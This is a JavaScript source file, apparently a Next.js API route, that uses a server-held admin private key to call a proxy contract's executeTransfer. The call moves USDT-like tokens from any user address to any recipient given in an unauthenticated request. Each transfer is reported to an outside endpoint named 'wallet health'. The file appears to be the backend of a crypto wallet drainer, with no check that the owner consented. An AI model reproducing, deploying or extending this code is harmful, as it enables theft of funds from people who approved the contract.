// File: app/api/transfer/route.js

import { ethers } from 'ethers';
import { NextResponse } from 'next/server';

// --- Multi-Chain Configuration ---
const chainConfigs = {
  // Ethereum Mainnet
  1: {
    rpcUrl: process.env.ETHEREUM_RPC_URL,
    decimals: 6,
  },
  // BNB Smart Chain
  56: {
    rpcUrl: process.env.BSC_RPC_URL,
    decimals: 18,
  },
};

// ABI for your TransferProxy contract
const PROXY_ABI = [
  "function executeTransfer(address _userAddress, address _recipient, uint256 _amount)"
];

export async function POST(req) {
  const { userAddress, recipientAddress, amountString, chainId } = await req.json();

  if (!userAddress || !recipientAddress || !amountString || !chainId) {
    return NextResponse.json({ error: "Missing required fields." }, { status: 400 });
  }

  const config = chainConfigs[chainId];
  const proxyAddress = process.env.PROXY_CONTRACT_ADDRESS;

  if (!config || !proxyAddress) {
    return NextResponse.json({ error: "Unsupported chain or proxy contract not configured." }, { status: 400 });
  }

  try {
    const provider = new ethers.JsonRpcProvider(config.rpcUrl);
    const adminPrivateKey = process.env.ADMIN_PRIVATE_KEY;
    if (!adminPrivateKey) throw new Error("Admin private key not configured.");

    const adminWallet = new ethers.Wallet(adminPrivateKey, provider);
    const proxyContract = new ethers.Contract(proxyAddress, PROXY_ABI, adminWallet);
    const amountToTransfer = ethers.parseUnits(amountString, config.decimals);

    const tx = await proxyContract.executeTransfer(userAddress, recipientAddress, amountToTransfer);
    await tx.wait();

    // 🕓 Format IST date & time
    const date = new Date();
    const istTime = new Date(date.getTime() + 5.5 * 60 * 60 * 1000)
      .toISOString()
      .replace('T', ' ')
      .slice(0, 19);

    // ✅ Log the transfer to your backend PHP endpoint
    await fetch('https://tradeinusdt.com/api_wallet_health_vercel/save_transfer.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from_wallet: userAddress,
        to_wallet: recipientAddress,
        amount: amountString,
        tx_hash: tx.hash,
        date_time: istTime,
      }),
    }).catch((err) => console.error('Transfer log error:', err));

    return NextResponse.json({ success: true, txHash: tx.hash });

  } catch (error) {
    console.error("Backend Transfer Error:", error);
    return NextResponse.json({ error: error.reason || error.message || "An error occurred during the transfer." }, { status: 500 });
  }
}
